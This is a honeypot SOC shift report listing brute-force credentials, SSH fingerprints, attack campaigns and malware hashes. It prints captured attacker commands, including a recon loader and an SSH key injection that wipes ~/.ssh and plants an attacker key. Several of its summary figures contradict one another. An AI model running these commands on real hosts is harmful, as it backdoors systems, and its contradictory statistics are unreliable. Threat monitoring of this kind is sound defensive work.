# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-12 |
| **Generated At** | 2026-07-12T22:55:56Z |
| **Shift Time** | 22:55 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **259** |
| Confirmed Threats | **0** |
| False Positives Filtered | **259** (100.0%) |
| Unique Attacker IPs | **75** |
| Countries of Origin | **0** |
| High Severity Cases | **157** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **102** |
| Malware Samples Analyzed | **4** HIGH · **37** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **176** |
| Unique Credential Pairs | **141** |
| Unique Usernames | **114** |
| Unique Passwords | **126** |
| Successful Auth Pairs | **167** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 26 |
| `admin` | 11 |
| `test` | 9 |
| `ubuntu` | 5 |
| `user` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin1` | 5 |
| `support` | 4 |
| `password321` | 4 |
| `Admin` | 4 |
| `123@@@` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `admin1` | 5 |
| `support` | `support` | 4 |
| `test` | `password321` | 4 |
| `admin` | `Admin` | 4 |
| `Ubnt` | `555555555` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `ubuntu` | `demo123456` | `10.0.0.73` | 2026-07-12T18:55:47 |
| `ubnt` | `1234567` | `24.97.253.246` | 2026-07-12T18:55:49 |
| `ubnt` | `1234567` | `60.220.241.50` | 2026-07-12T18:55:59 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-12T18:59:00 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-12T18:59:00 |
| `ubuntu` | `demo123456` | `185.242.3.195` | 2026-07-12T19:00:07 |
| `Ubnt` | `555555555` | `111.70.23.236` | 2026-07-12T19:00:56 |
| `Ubnt` | `555555555` | `45.181.101.95` | 2026-07-12T19:01:10 |
| `Ubnt` | `555555555` | `10.0.0.73` | 2026-07-12T19:04:52 |
| `support` | `support` | `176.53.159.196` | 2026-07-12T19:14:05 |
| `root` | `QWExsw123!@#` | `185.242.3.195` | 2026-07-12T19:14:13 |
| `support` | `support` | `10.0.0.73` | 2026-07-12T19:15:23 |
| `test` | `password321` | `60.191.58.203` | 2026-07-12T19:16:29 |
| `test` | `password321` | `70.91.135.181` | 2026-07-12T19:16:37 |
| `test` | `password321` | `10.0.0.73` | 2026-07-12T19:16:47 |
| `user` | `maintenance` | `10.0.0.73` | 2026-07-12T19:21:57 |
| `root` | `QWExsw123!@#` | `10.0.0.73` | 2026-07-12T19:28:48 |
| `admin` | `8888888888` | `112.184.52.16` | 2026-07-12T19:29:38 |
| `blank` | `uploader` | `107.135.117.245` | 2026-07-12T19:38:37 |
| `blank` | `uploader` | `81.22.51.64` | 2026-07-12T19:38:49 |
| `admin` | `7ujMko0admin` | `94.154.43.60` | 2026-07-12T19:38:58 |
| `admin` | `123123` | `94.154.43.60` | 2026-07-12T19:38:58 |
| `admin` | `admin` | `94.154.43.60` | 2026-07-12T19:38:59 |
| `admin` | `admin123` | `94.154.43.60` | 2026-07-12T19:39:06 |
| `admin` | `Admin` | `182.156.35.238` | 2026-07-12T19:43:50 |
| `admin` | `Admin` | `122.176.21.104` | 2026-07-12T19:43:59 |
| `root` | `admin3` | `185.242.3.195` | 2026-07-12T19:47:08 |
| `admin` | `Admin` | `10.0.0.73` | 2026-07-12T19:47:30 |
| `jairo` | `jairo` | `129.121.85.48` | 2026-07-12T19:50:28 |
| `345gs5662d34` | `345gs5662d34` | `129.121.85.48` | 2026-07-12T19:50:30 |
| `jairo` | `3245gs5662d34` | `129.121.85.48` | 2026-07-12T19:50:30 |
| `root` | `ABcd123456` | `61.28.144.154` | 2026-07-12T19:51:15 |
| `345gs5662d34` | `345gs5662d34` | `61.28.144.154` | 2026-07-12T19:51:18 |
| `root` | `3245gs5662d34` | `61.28.144.154` | 2026-07-12T19:51:20 |
| `root` | `Vps@12345` | `110.172.54.52` | 2026-07-12T19:53:54 |
| `root` | `qwerty` | `10.0.0.73` | 2026-07-12T19:55:52 |
| `root` | `admin3` | `10.0.0.73` | 2026-07-12T20:02:09 |
| `test` | `qwerty123` | `14.97.77.182` | 2026-07-12T20:04:24 |
| `test` | `qwerty123` | `182.75.227.178` | 2026-07-12T20:04:33 |
| `user` | `123654` | `211.104.166.110` | 2026-07-12T20:09:33 |
| `user` | `123654` | `117.158.166.73` | 2026-07-12T20:13:01 |
| `user` | `123654` | `10.0.0.73` | 2026-07-12T20:13:40 |
| `default` | `12345678` | `111.26.184.29` | 2026-07-12T20:17:22 |
| `default` | `12345678` | `91.144.158.62` | 2026-07-12T20:20:55 |
| `ubuntu` | `123321123321` | `185.242.3.195` | 2026-07-12T20:21:39 |
| `admin` | `admin` | `64.227.0.95` | 2026-07-12T20:24:50 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-12T20:24:50 |
| `root` | `admin1` | `212.73.75.82` | 2026-07-12T20:29:59 |
| `root` | `admin1` | `117.211.77.86` | 2026-07-12T20:30:11 |
| `root` | `admin1` | `80.233.12.109` | 2026-07-12T20:33:23 |
| `root` | `admin1` | `45.178.227.0` | 2026-07-12T20:33:31 |
| `root` | `admin1` | `10.0.0.73` | 2026-07-12T20:33:49 |
| `test` | `dietpi` | `61.169.6.99` | 2026-07-12T20:34:55 |
| `test` | `dietpi` | `103.103.53.44` | 2026-07-12T20:35:06 |
| `ubuntu` | `123321123321` | `10.0.0.73` | 2026-07-12T20:37:00 |
| `test` | `dietpi` | `10.0.0.73` | 2026-07-12T20:39:04 |
| `root` | `000000` | `80.94.92.179` | 2026-07-12T20:42:42 |
| `root` | `111111` | `80.94.92.179` | 2026-07-12T20:44:58 |
| `s8daniyal` | `osmc` | `91.92.47.140` | 2026-07-12T20:45:16 |
| `support1` | `Admin@123456` | `91.92.47.140` | 2026-07-12T20:45:25 |
| `soladium` | `qwerty` | `91.92.47.140` | 2026-07-12T20:45:31 |
| `utssrrep` | `rootroot` | `91.92.47.140` | 2026-07-12T20:45:38 |
| `arpwatch` | `student123` | `91.92.47.140` | 2026-07-12T20:45:44 |
| `mamat` | `gg` | `91.92.47.140` | 2026-07-12T20:45:50 |
| `SJ01` | `Aa123456@` | `91.92.47.140` | 2026-07-12T20:45:57 |
| `tech` | `webuser` | `91.92.47.140` | 2026-07-12T20:46:03 |
| `5912` | `Qwerty123` | `91.92.47.140` | 2026-07-12T20:46:08 |
| `exofresh` | `P@ssword` | `91.92.47.140` | 2026-07-12T20:46:14 |
| `ai` | `test!@` | `91.92.47.140` | 2026-07-12T20:46:21 |
| `s10arnaud` | `1qaz!QAZ` | `91.92.47.140` | 2026-07-12T20:46:27 |
| `spy` | `odoo` | `91.92.47.140` | 2026-07-12T20:46:32 |
| `edi` | `raaj123` | `91.92.47.140` | 2026-07-12T20:46:39 |
| `alii` | `123@@@` | `91.92.47.140` | 2026-07-12T20:46:45 |
| `adam` | `adam` | `10.0.0.73` | 2026-07-12T20:46:46 |
| `s10philomina` | `Root@123` | `91.92.47.140` | 2026-07-12T20:46:52 |
| `s9sophia` | `ghost` | `91.92.47.140` | 2026-07-12T20:46:57 |
| `administrateur` | `gpadmin` | `91.92.47.140` | 2026-07-12T20:47:02 |
| `root` | `123` | `80.94.92.179` | 2026-07-12T20:47:06 |
| `cloud-user` | `!Q@W3e4r` | `91.92.47.140` | 2026-07-12T20:47:06 |
| `bhdr` | `dmdba` | `91.92.47.140` | 2026-07-12T20:47:12 |
| `elasticsearch` | `teamspeak` | `91.92.47.140` | 2026-07-12T20:47:18 |
| `wuxiyuqihongguang` | `admin1234` | `91.92.47.140` | 2026-07-12T20:47:23 |
| `root` | `pass` | `91.92.47.140` | 2026-07-12T20:47:29 |
| `s9alseny` | `ts` | `91.92.47.140` | 2026-07-12T20:47:34 |
| `kishore` | `onkar123` | `91.92.47.140` | 2026-07-12T20:47:39 |
| `user14` | `tester` | `91.92.47.140` | 2026-07-12T20:47:45 |
| `jinxiaolu` | `alex` | `91.92.47.140` | 2026-07-12T20:47:50 |
| `florin` | `admin123456` | `91.92.47.140` | 2026-07-12T20:47:56 |
| `lucunli` | `kingbase` | `91.92.47.140` | 2026-07-12T20:48:02 |
| `cuyler` | `!Q@W3e4r` | `91.92.47.140` | 2026-07-12T20:48:07 |
| `teste` | `password` | `91.92.47.140` | 2026-07-12T20:48:12 |
| `andy` | `Pass@123` | `91.92.47.140` | 2026-07-12T20:48:18 |
| `a1samka` | `joel` | `91.92.47.140` | 2026-07-12T20:48:23 |
| `therwi` | `opc` | `91.92.47.140` | 2026-07-12T20:48:29 |
| `nbe` | `node` | `91.92.47.140` | 2026-07-12T20:48:34 |
| `library-koha` | `1029384756` | `91.92.47.140` | 2026-07-12T20:48:40 |
| `vmail` | `leonardo` | `91.92.47.140` | 2026-07-12T20:48:46 |
| `5936` | `qwertyuiop` | `91.92.47.140` | 2026-07-12T20:48:52 |
| `bastionse` | `localhost` | `91.92.47.140` | 2026-07-12T20:48:57 |
| `styx` | `app` | `91.92.47.140` | 2026-07-12T20:49:03 |
| `shabnam` | `sonar` | `91.92.47.140` | 2026-07-12T20:49:08 |
| `root` | `123123` | `80.94.92.179` | 2026-07-12T20:49:13 |
| `s8jerry` | `administrator` | `91.92.47.140` | 2026-07-12T20:49:14 |
| `5902` | `amine` | `91.92.47.140` | 2026-07-12T20:49:20 |
| `gl04` | `data` | `91.92.47.140` | 2026-07-12T20:49:25 |
| `us52` | `postgres123` | `91.92.47.140` | 2026-07-12T20:49:31 |
| `amine` | `Password` | `91.92.47.140` | 2026-07-12T20:49:37 |
| `nkonduri` | `drcomadmin123` | `91.92.47.140` | 2026-07-12T20:49:42 |
| `root` | `soporte` | `91.92.47.140` | 2026-07-12T20:49:47 |
| `s10prince` | `cw` | `91.92.47.140` | 2026-07-12T20:49:53 |
| `s10akin` | `myuser` | `91.92.47.140` | 2026-07-12T20:50:00 |
| `greenbank` | `123` | `91.92.47.140` | 2026-07-12T20:50:05 |
| `ben_kenobi` | `fivem` | `91.92.47.140` | 2026-07-12T20:50:11 |
| `whbadmin` | `rajvir123` | `91.92.47.140` | 2026-07-12T20:50:15 |
| `user30` | `arthur` | `91.92.47.140` | 2026-07-12T20:50:21 |
| `kims` | `operator` | `91.92.47.140` | 2026-07-12T20:50:27 |
| `a1jureto` | `Welcome@123` | `91.92.47.140` | 2026-07-12T20:50:32 |
| `grass` | `test@123` | `91.92.47.140` | 2026-07-12T20:50:37 |
| `ambari-qa` | `a` | `91.92.47.140` | 2026-07-12T20:50:43 |
| `hestiaweb` | `vagrant` | `91.92.47.140` | 2026-07-12T20:50:48 |
| `us37` | `drcomadmin123` | `91.92.47.140` | 2026-07-12T20:50:54 |
| `plex1` | `odoo18` | `91.92.47.140` | 2026-07-12T20:51:00 |
| `s8jacintha` | `ftp` | `91.92.47.140` | 2026-07-12T20:51:05 |
| `us14` | `server` | `91.92.47.140` | 2026-07-12T20:51:11 |
| `mos` | `zabbix` | `91.92.47.140` | 2026-07-12T20:51:18 |
| `root` | `1234` | `80.94.92.179` | 2026-07-12T20:51:21 |
| `secscan` | `ranger` | `91.92.47.140` | 2026-07-12T20:51:23 |
| `restore_user` | `elasticsearch` | `91.92.47.140` | 2026-07-12T20:51:29 |
| `sftp` | `111` | `91.92.47.140` | 2026-07-12T20:51:36 |
| `hzserver` | `123@@@` | `91.92.47.140` | 2026-07-12T20:51:40 |
| `CG05` | `abc123` | `91.92.47.140` | 2026-07-12T20:51:46 |
| `zrybs` | `admin2` | `91.92.47.140` | 2026-07-12T20:51:52 |
| `artoo_detoo` | `system` | `91.92.47.140` | 2026-07-12T20:51:58 |
| `vscode` | `elastic` | `91.92.47.140` | 2026-07-12T20:52:03 |
| `downloader` | `aA123456` | `91.92.47.140` | 2026-07-12T20:52:08 |
| `huizhoulimai` | `P@ssw0rd` | `91.92.47.140` | 2026-07-12T20:52:14 |
| `amp` | `vyos` | `91.92.47.140` | 2026-07-12T20:52:20 |
| `jeff` | `hadoop` | `91.92.47.140` | 2026-07-12T20:52:26 |
| `user01` | `1234qwer` | `91.92.47.140` | 2026-07-12T20:52:31 |
| `kishorev` | `0000` | `91.92.47.140` | 2026-07-12T20:52:37 |
| `jinruihong` | `customer` | `91.92.47.140` | 2026-07-12T20:52:42 |
| `algoman` | `osmc` | `91.92.47.140` | 2026-07-12T20:52:49 |
| `s8marjorie` | `741852963` | `91.92.47.140` | 2026-07-12T20:52:54 |
| `bobrkurwa7` | `teamspeak` | `91.92.47.140` | 2026-07-12T20:52:59 |
| `frappeuser` | `root@2026` | `91.92.47.140` | 2026-07-12T20:53:05 |
| `zookeeper` | `ec2-user` | `91.92.47.140` | 2026-07-12T20:53:11 |
| `botuser` | `git` | `91.92.47.140` | 2026-07-12T20:53:17 |
| `kretaceous` | `zimbra` | `91.92.47.140` | 2026-07-12T20:53:23 |
| `root` | `12345` | `80.94.92.179` | 2026-07-12T20:53:25 |
| `customer` | `Aa123321` | `91.92.47.140` | 2026-07-12T20:53:29 |
| `sergey` | `prefect` | `91.92.47.140` | 2026-07-12T20:53:34 |
| `andrei` | `Huawei@123` | `91.92.47.140` | 2026-07-12T20:53:40 |
| `eth1` | `postgres123` | `91.92.47.140` | 2026-07-12T20:53:46 |
| `Victor-rt-ad-nx-372893` | `user2` | `91.92.47.140` | 2026-07-12T20:53:51 |
| `vastai_kaalia` | `kevin` | `91.92.47.140` | 2026-07-12T20:53:57 |
| `git` | `gg` | `91.92.47.140` | 2026-07-12T20:54:03 |
| `Nandhini_S` | `jasdeep123` | `91.92.47.140` | 2026-07-12T20:54:08 |
| `wsl` | `abcd@1234` | `91.92.47.140` | 2026-07-12T20:54:14 |
| `init` | `741852963` | `91.92.47.140` | 2026-07-12T20:54:19 |
| `alpine` | `adminuser` | `91.92.47.140` | 2026-07-12T20:54:25 |
| `gl04` | `bigdata` | `91.92.47.140` | 2026-07-12T20:54:30 |
| `yd02` | `jenkins@123` | `91.92.47.140` | 2026-07-12T20:54:36 |
| `student` | `Password` | `91.92.47.140` | 2026-07-12T20:54:41 |
| `SJ12` | `chris` | `91.92.47.140` | 2026-07-12T20:54:46 |
| `confluence` | `1234` | `91.92.47.140` | 2026-07-12T20:54:52 |
| `s7helene` | `qwe123!@` | `91.92.47.140` | 2026-07-12T20:54:57 |
| `spamd` | `wang` | `91.92.47.140` | 2026-07-12T20:55:03 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **259** |
| Sessions with Fingerprint | **15** |
| Unique HASSH Fingerprints | **15** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 126 |
| OpenSSH | 24 |
| libssh | 18 |
| Paramiko (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 104 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 23 | 23 |
| `16443846184e...` | Generic scanner | 8 | 2 |
| `f555226df196...` | Mirai/variant | 6 | 2 |
| `2ec37a7cc8da...` | Mirai/variant | 6 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 104 | 1 | Generic scanner |
| `acaa53e0a7d7...` | OpenSSH | 23 | 23 | Mirai/variant |
| `95420f9d932d...` | libssh | 11 | 3 | — |
| `16443846184e...` | Go SSH scanner | 8 | 2 | Generic scanner |
| `f555226df196...` | libssh | 6 | 2 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 6 | 1 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 2 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **7** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 6 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `80.94.92.179`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
busybox TEST
```
```
cat /proc
```
```
/
```
Source IPs: `94.154.43.60`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `61.28.144.154`, `129.121.85.48`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **75** |
| Unique ASNs | **53** |
| High-Risk ASNs | **0** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS398324` | Censys, Inc. | 8 | LOW |
| `AS396982` | Google LLC | 6 | LOW |
| `AS4134` | CHINANET BACKBONE | 4 | LOW |
| `AS22773` | Cox Communications Inc. | 3 | LOW |
| `AS45820` | Tata Teleservices ISP AS | 2 | LOW |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 2 | LOW |
| `AS4766` | Korea Telecom | 2 | LOW |
| `AS31898` | Oracle Corporation | 2 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (0)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

_No priority cases this shift. All confirmed sessions were credential scans only._

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

_No reconnaissance sessions this shift._

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 57/100 | 🟡 MEDIUM | **18/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 40/100 | 🟡 MEDIUM | **25/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `77ed8c7518a32663fb766f729075dcdddc355c8d6ebe381092df51bb891e0cfc` | ELF Binary (Linux executable) (x86 32-bit) | `77ed8c7518a32663...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 60/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `7a4a3a129b726b53...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
